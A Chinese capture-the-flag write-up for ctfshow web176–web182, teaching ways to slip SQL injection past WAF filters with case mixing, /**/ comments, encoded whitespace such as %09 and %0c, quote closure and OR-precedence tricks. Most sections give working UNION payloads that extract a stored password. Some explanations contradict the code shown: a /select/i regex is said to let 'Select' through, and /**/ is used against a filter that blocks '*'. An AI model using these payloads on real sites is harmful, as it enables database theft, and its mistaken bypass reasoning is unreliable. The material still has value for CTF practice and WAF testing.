## 一句话概括

WAF 把空格、`--+`、`select` 这些注入特征拉黑时，只要换一个功能等价但字面不同的写法就能过去：空格换成 `/**/` 或 `%09`，`--` 换成 `#`，`select` 换成 `Select`。绕过不是"破解"，而是利用 SQL 语法本身的多样性。

## 被过滤的东西 → 绕过手法对照表

| 被过滤的东西 | 等价替代 | 说明 |
|---|---|---|
| 空格 `%20` | `/**/` | 内联注释，SQL 词法层把它当空白 |
| 空格 | `%09` `%0a` `%0b` `%0c` `%0d` | 制表符/换行/垂直制表/换页/回车，都是合法空白符 |
| 空格 | `%a0` | 不换行空格，仅在特定字符集下被当空白 |
| 空格 | `` ` `` 反引号 | 包裹标识符，紧贴关键字时起到分隔作用 |
| `select` | `Select` / `SeLeCt` | 大小写混淆 |
| `select` | `/**/select` | 内联注释插在关键字中间 |
| `--+` | `#` / `%23` | 另一种单行注释符 |
| `--+` | `--%0c` | 用非标准空白符污染注释语法 |
| `--+` / `%23` | 干脆不注释 | 精确闭合，让 payload 与原 SQL 无缝衔接 |
| 括号内空格 | 反引号 | `` (select`password`from`ctfshow_user`) `` |

## 本题情景与解题手法：web176

### 题目形态

页面是一个 `id` 参数查询，直接回显用户名/密码。后端 SQL：

```php
$sql = "select username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
// WAF
if (preg_match('/select/i', $_GET['id'])) { die('sql inject error'); }
```

### 第一步：正常 payload 被拦

```sql
-1' union select 1,2,3 --+
```

被 WAF 拦下，提示 `sql inject error`，说明命中了 `select` 关键字。

### 第二步：换大小写

```sql
-1' union Select 1,2,3 --+
```

通过。因为 WAF 的正则 `/select/i` 通常写死小写，而 MySQL 的关键字大小写不敏感，`Select` 与 `select` 完全等价。

### 注入手法一句话总结

命中了关键字黑名单，就用大小写变换或内联注释，让字面值与黑名单不匹配、但数据库仍能正常解析。

## 本题情景与解题手法：web177 / web178 / web179

### 题目形态

同样的注入点，但 WAF 升级：

```php
if (preg_match('/ |\*|--\+|#/i', $_GET['id'])) { die('sql inject error'); }
```

空格和 `--+` 都被过滤了。

### 第一步：空格换成内联注释

```sql
-1'union/**/select/**/1,2,(select`password`from`ctfshow_user`where`username`='flag')%23
```

注意三处手法：

- 所有关键字之间的空格换成 `/**/`；
- 原 SQL 里的 `ctfshow_user`、`password` 等标识符用反引号包裹，紧贴关键字，省掉空格；
- 结尾的注释改用 `%23`（`#` 的 URL 编码），因为 `--+` 被拉黑了。

### 第二步：空格换成制表符

```sql
-1'union%09select%091,2,password%09from%09ctfshow_user%23
```

`%09` 是 Tab。MySQL 词法分析阶段会把所有空白字符（空格、Tab、换行、回车、垂直制表、换页）统一当成同一个分隔符，所以 `%09` 完全可以顶替空格。同理可用的还有：

| 编码 | 字符 | 名称 | 用途 |
|---|---|---|---|
| `%0a` | `\n` | 换行符 (Line Feed) | 分割关键词 |
| `%0b` | `\v` | 垂直制表符 (Vertical Tab) | 不常见的空白符 |
| `%0c` | `\f` | 换页符 (Form Feed) | 不常见的空白符 |
| `%0d` | `\r` | 回车符 (Carriage Return) | 分割关键词 |
| `%09` | `\t` | 水平制表符 (Tab) | 替代空格 |
| `%a0` | | 不换行空格 | 特定字符集才能利用 |

注意本题把最常见的 `%20`（空格）也过滤了，所以上表这些偏门的空白符才派上用场。

### 第三步：验证最简写法

```sql
1'%09%23
1'%09order%09by%093%23
```

### 注入手法一句话总结

空格被拉黑，就换成任何"数据库认、WAF 不认"的空白字符（`/**/`、`%09`、`%0a` 等）；`--+` 被拉黑，就换 `%23`。

## 本题情景与解题手法：web180

### 题目形态

WAF 进一步把 `--+` 和 `%23` 都拉黑了：

```php
if (preg_match('/ |\*|--\+|#|\x23/i', $_GET['id'])) { die('sql inject error'); }
```

### 解法一：不注释，精确闭合

```sql
-1'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'2
```

为什么不用注释也能跑通？把 payload 代入原 SQL（原语句是 `... id = '[输入]' limit 1;`）：

```sql
select username,password from ctfshow_user
where username !='flag' and id = '-1'union select '1',(
      select `password` from `ctfshow_user` where `username`='flag'
  ),'2' limit 1;
```

拆解：

1. `id = '-1'`：payload 开头的 `'` 闭合了原 SQL 的前引号；
2. `union select '1',(子查询),'2'`：构造出 3 列，第一列是字符串 `'1'`，第二列是子查询结果，第三列是……
3. 关键的第三步：payload 结尾写的是 `'2`（只有一个引号），而原 SQL 末尾本来就有一个 `'`，两者拼成了完整的字符串 `'2'`，正好补上第三列；
4. 剩下的 `limit 1` 继续生效。

用原 SQL 自带的那个引号来帮自己收尾，payload 像拼图一样无缝嵌进原语句，根本不需要注释符。之所以能跑通，是因为列值 `'2'` 被完整闭合了，跟解析器容不容错无关。

### 解法二：混淆注释 `--%0c`

```sql
-1'%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c'flag')%0c--%0c
```

### 为什么 `--%0c` 能过 WAF

`--` 注释的完整格式是 `--[空白符][任意文本]`，`--` 后面必须跟一个空白符才生效，空格不是注释符的一部分，而是它的触发条件。

- WAF 侧：它的正则通常写成匹配 `-- ` 或 `--\s`，只考虑了空格、换行这类常见空白；`%0c`（换页符）不在它的考虑范围内，于是规则匹配失败，payload 被放行。
- 数据库侧：MySQL 在词法分析阶段会把 `%0c` 和空格一视同仁地当成空白符，所以 `--%0c` 被正确识别为注释，`--` 之后的内容全部被注释掉。

```text
WAF 看到：   -1' [%0c] union [%0c] select ... --%0c
              ↑ 没有它认识的标准注释符 → 放行
MySQL 看到： -1' union select ... --            ↑ 合法注释，后面全废
```

### 注入手法一句话总结

注释符被拉黑时，有两条路：要么用精确闭合让 payload 不需要注释；要么找一个 WAF 正则漏掉的空白符（`%0c`）来污染注释语法。

## 本题情景与解题手法：web181 / web182

### 题目形态

页面不再过滤空格，而是在 SQL 里加了一个排除条件，把 flag 用户挡掉：

```php
$sql = "select username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

直接查 `id=26` 没用，`username != 'flag'` 会把它过滤掉。

### 第一步：利用 AND 高于 OR 的优先级

```sql
-1'or(id=26)and'1'='1
```

代入后是：

```sql
where username !='flag' and id = '-1' or (id=26) and ('1'='1') limit 1;
```

SQL 里 `AND` 的优先级高于 `OR`，所以实际按下面的方式加括号：

```sql
where (username !='flag' and id = '-1') or (id=26 and '1'='1') limit 1;
```

逐项化简：

| 子表达式 | 结果 | 原因 |
|---|---|---|
| `id = '-1'` | 假 | 不存在 id 为 -1 的记录 |
| `'1'='1'` | 真 | 恒真 |
| `username !='flag' and id='-1'` | 假 | 前半真、后半假 |
| `id=26 and '1'='1'` | 真 | id=26 存在 |

最终 `假 OR 真 = 真`，于是 `id=26` 那一行（用户名为 `flag` 的记录）被返回，完全绕过了 `username != 'flag'` 的限制。

### 注入手法一句话总结

原 SQL 用 `and` 加了一个排除条件时，用 `or` 把整个条件旁路掉，靠 `AND > OR` 的优先级，让 `or (id=目标)` 独立成立即可。

这一思路配合脚本爆破 id 会更快，不知道目标 id 是多少时，用 `or(id=N)` 逐个试。

## 注意事项

- `/**/` 既是空白符也是注释：`union/**/select` 能起到分隔作用，是因为 MySQL 把内联注释当成空白；但如果写在关键字中间（如 `sel/**/ect`），多数情况下反而会破坏关键字，慎用。
- `--` 后面必须有空白：直接写 `--` 在部分客户端不生效，`--+` 里的 `+` 就是为了在 URL 中补出空格。
- 空白符的认不认取决于层：WAF 只认常见空白，MySQL 全认，这正是 `%0c` 类手法的立足点。
- `order by` 的数字也可能被拦：某些题会过滤数字，那时判断列数要改用别的办法，见 `过滤绕过-数字与引号`。
- web181/web182 的 id 需要爆破：示例里用 `or(id=26)`，实际 id 未知时写脚本枚举即可。
